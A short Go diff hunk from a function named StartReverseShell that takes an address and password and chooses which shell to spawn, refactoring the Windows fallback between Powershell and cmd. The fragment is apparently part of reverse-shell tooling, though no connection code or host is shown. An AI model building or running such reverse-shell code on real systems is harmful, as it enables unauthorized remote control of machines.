@@ -26,9 +26,8 @@ func StartReverseShell(address, password string) {
 	shellString := "/bin/bash"
 
 	if runtime.GOOS == "windows" {
-		_, err := exec.LookPath("Powershell")
-		if err != nil {
-			shellString = "cmd /C"
+		if _, err := exec.LookPath("Powershell"); err != nil {
+			shellString = "cmd"
 		} else {
 			shellString = "Powershell"
 		}
